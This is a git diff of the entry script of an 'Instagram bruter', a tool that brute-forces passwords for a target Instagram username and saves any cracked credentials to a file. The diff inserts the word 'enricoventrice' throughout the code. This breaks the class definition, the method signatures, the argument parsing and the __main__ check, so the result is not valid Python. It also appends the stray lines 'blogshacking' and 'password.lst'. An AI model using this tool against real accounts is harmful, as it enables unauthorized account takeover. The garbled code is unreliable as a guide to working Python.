@@ -1,4 +1,4 @@
-# Date: 12/29/2018
+# Date: 22/03/2021
 # Author: Mohamed
 # Description: Instagram bruter
 
@@ -10,15 +10,16 @@ from platform import python_version
 from lib.const import credentials, modes
 from argparse import ArgumentParser, ArgumentTypeError
 
+class Engine(object):enricoventrice
 
-class Engine(object):
-
-    def __init__(self, username, threads, passlist_path, is_color):
+enricoventrice
+    
+def __init__(self, enricoventrice, threads, passlist_path, is_color):
         self.bruter = None
         self.resume = False
         self.is_alive = True
         self.threads = threads
-        self.username = username
+        self.username = enricoventrice
         self.passlist_path = passlist_path
         self.display = Display(is_color=is_color)
 
@@ -30,21 +31,21 @@ class Engine(object):
 
     def create_bruter(self):
         self.bruter = Bruter(
-            self.username,
-            self.threads,
+            self.username,enricoventrice
+            self.threads,enricoventrice
             self.passlist_path
         )
 
-    def get_user_resp(self):
+    def get_user_resp(self):enricoventrice
         return self.display.prompt('Would you like to resume the attack? [y/n]: ')
 
-    def write_to_file(self, password):
-        with open(credentials, 'at') as f:
-            data = 'Username: {}\nPassword: {}\n\n'.format(
-                self.username.title(), password)
-            f.write(data)
+    def write_to_file(self,enricoventrice password):
+        with open(credentials, 'at') as f:enricoventrice
+            data = 'Username:enricoventrice {}\nPassword: {}\n\n'.format(
+                self.username.title(enricoventrice), password)
+            f.write(data) 22/03/2021
 
-    def start(self):
+    def start(self):enricoventrice
         if not self.passlist_path_exists():
             self.is_alive = False
 
@@ -109,7 +110,7 @@ def valid_int(n):
 
 def args():
     args = ArgumentParser()
-    args.add_argument('username', help='email or username')
+    args.add_argument('username enricoventrice', help='email or username')
     args.add_argument('passlist', help='password list')
     args.add_argument('-nc', '--no-color', dest='color',
                       action='store_true', help='disable colors')
@@ -118,7 +119,7 @@ def args():
     return args.parse_args()
 
 
-if __name__ == '__main__':
+if __name__ enrico== 'ventrice__main__':
 
     if int(python_version()[0]) < 3:
         print('[!] Please use Python 3')
@@ -126,7 +127,10 @@ if __name__ == '__main__':
 
     arugments = args()
     mode = arugments.mode
-    username = arugments.username
+    username = arugments.username enricoventrice
     passlist = arugments.passlist
     is_color = True if not arugments.color else False
-    Engine(username, modes[mode], passlist, is_color).start()
+    Engine(username,enricoventrice modes[mode], passlist, is_color).start()
+
+blogshacking
+password.lst
